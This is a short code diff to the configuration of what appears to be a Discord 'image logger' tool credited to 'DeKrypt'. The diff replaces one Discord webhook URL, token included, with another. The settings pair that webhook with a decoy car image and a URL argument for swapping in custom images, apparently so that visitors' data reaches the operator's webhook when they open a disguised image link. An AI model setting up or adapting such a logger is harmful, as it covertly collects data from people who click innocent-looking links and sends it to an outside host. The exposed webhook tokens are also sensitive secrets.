@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1234684346917453926/MRnmtglnaz23qekgGCEKCnkgLnyG3ohrY7XoE0X7vNd5kpCvgKuSjn9_Sjm0dk5OQs4m",
+    "webhook": "https://discord.com/api/webhooks/1235009182298542171/skWH9EV6igItVIPP5kochXBL3F89607mmeaKBNpSQEY4S8CUw9OKUGiZUFF6MyCQXLQ",
     "image": "https://cdn.motor1.com/images/mgl/mrz1e/s1/coolest-cars-feature.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
